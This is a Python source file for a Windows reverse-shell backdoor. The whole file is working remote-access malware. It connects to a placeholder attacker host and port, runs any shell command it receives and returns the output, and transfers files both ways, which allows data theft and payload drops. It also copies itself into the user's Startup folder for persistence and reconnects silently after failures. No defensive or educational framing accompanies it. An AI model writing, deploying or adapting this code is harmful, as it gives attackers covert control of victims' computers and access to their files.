import socket
import subprocess
import os
import platform
import sys
import winreg


def send_file(filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        s.send("Path doesn't exist!".encode())
        return
    s.send(str(filesize).encode())
    if filesize == 0:
        return
    if s.recv(BUFFER_SIZE).decode() == "ok":
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)


def recv_file(path):
    filesize = int(s.recv(BUFFER_SIZE).decode())
    s.send("ok".encode())
    left = filesize
    try:
        f = open(path, "wb")
        while 1:
            rev = s.recv(BUFFER_SIZE)
            f.write(rev)
            left -= len(rev)
            if left == 0:
                break
        f.close()
    except FileNotFoundError:
        s.send("No such file or directory".encode())


def set_startup():
    os.system("copy " + sys.argv[0] + " \"C:\\Users\\" + os.environ['USERNAME'] + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")


def run():
    while True:
        # receive the command from the server
        cmd = s.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
        print(cmd)
        if cmd.lower() == "exit":
            # if the command is exit, close the program
            s.close()
            sys.exit(0)
        elif cmd[:2] == 'cd':
            if cmd[3] == '~':
                os.chdir(os.environ['HOME'] + (cmd[4:] if len(cmd)>3 else None))
            else:
                try:
                    os.chdir(cmd[3:])
                except FileNotFoundError:
                    pass
            s.send(os.getcwd().encode() + os.getcwd().encode() + "> ".encode())
        elif cmd[:7] == "sysinfo":
            s.send(platform.platform().encode() + "\n".encode())
        # File download
        elif cmd[:8] == "download":
            filename = cmd[9:]
            send_file(filename)
        # File upload
        elif cmd[:6] == "upload":
            filename = cmd[7:]
            recv_file(filename)
        elif cmd[:7] == "startup":
            set_startup()
        else:
            p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            # send the results back to the server
            s.send(p.stdout + "\n".encode() + os.getcwd().encode() + "> ".encode())


if __name__ == '__main__':
    SERVER_HOST = "$HOST$"
    SERVER_PORT = "$PORT$"
    BUFFER_SIZE = 10240
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
    p = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    s.send(os.getcwd().encode())
    while True:
        try:
            run()
        except socket.error:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            p = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
            s.send(os.getcwd().encode())
        except:
            pass
